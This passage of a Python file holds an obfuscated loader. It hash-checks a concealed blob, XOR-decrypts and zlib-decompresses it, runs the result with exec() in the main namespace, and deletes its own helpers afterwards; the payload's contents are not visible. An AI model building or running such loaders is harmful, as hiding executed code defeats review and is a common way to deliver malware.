_cl8uevrkkkBCUa + _csfJwxAdTrC1Me + _cpIBp6FD2PAsNR + _crgMhy5cbP4Jn_ + _cxEDPyZuCnHg5i + _coH2QoUkUQqUh3 + _cjAF7eQbxEY8fc + _cqvb3mTGCrYZRW + _ch1Ko0BMZiaAfY + _cobToXJ6PyWBtK + _cbPPkWPdcxFsTI + _cdWHX1_aUbvRuY + _cnABPmLPMFmVap + _ccOjAnjEjWPVkZ + _cv_qMOTTwvILwb + _cz5WlE5waZy5lq + _cx64jcP6XqWzRk + _cki0rOpoHrQ2zg + _ciiAizZ9TayP2D + _cq5HfsY66Oe8lN + _cy9fVKtMCELW7A + _cmXx7JbbRnjDMn + _chfsfTfwv4C8sw + _coEONGQyu5dD3C + _cnWrkAcblmv7qp + _cbvg053ZXPs0F5)
if __import__('hashlib').sha256(_pv83UurDIHMioa).hexdigest() != '9acc7d52300c226c4de848aec14fe55ae3b1c6562de516569f158e1a2528b2bf':
    __import__('sys').exit(1)
_xbOP8rS8uAnRjJ = bytes([142, 200, 167, 172, 144, 253, 29, 70, 33])
_fks67mfUjDGKfs2 = bytes([101, 81, 173, 162, 247, 2, 36, 136, 168])

def _fxm9rEDSVN9tA4c(_buwRFcSmp6ArLP, _kyfBtmzl_340uL):
    return bytes(_buwRFcSmp6ArLP[_ikvkBtAiDhgewB] ^ _kyfBtmzl_340uL[_ikvkBtAiDhgewB % len(_kyfBtmzl_340uL)] for _ikvkBtAiDhgewB in range(len(_buwRFcSmp6ArLP)))

def _fdw99XjO987Ez_X(_tlt9ihgoMlbG9O):
    import zlib
    return zlib.decompress(_tlt9ihgoMlbG9O) # Un seul niveau de zlib ici pour simplifier

def _fe_f7r5kIFFHQyy():
    import sys, builtins
    # 1. Déchiffrement XOR
    _xfGax6wjCq7OCj = _fxm9rEDSVN9tA4c(_pv83UurDIHMioa, _xbOP8rS8uAnRjJ)
    # 2. Décompression Zlib
    _duemBwUJScD7ni = _fdw99XjO987Ez_X(_xfGax6wjCq7OCj)
    # 3. Conversion bytes -> string (C'est là la différence clé !)
    source_code = _duemBwUJScD7ni.decode('utf-8')
    
    # 4. Préparation de l'environnement
    _main = sys.modules['__main__']
    _nwAErZoNhNXJxe = _main.__dict__
    _nwAErZoNhNXJxe.setdefault('__builtins__', builtins)
    
    # 5. Exécution directe du code source
    # On compile à la volée, ce qui marche sur n'importe quelle version de Python
    try:
        exec(source_code, _nwAErZoNhNXJxe)
    except Exception as e:
        print(f"Erreur fatale: {e}")
        sys.exit(1)

_fe_f7r5kIFFHQyy()
try:
    del _fxm9rEDSVN9tA4c, _fdw99XjO987Ez_X, _fe_f7r5kIFFHQyy
    del _pv83UurDIHMioa, _xbOP8rS8uAnRjJ, _fks67mfUjDGKfs2
except:
    pass
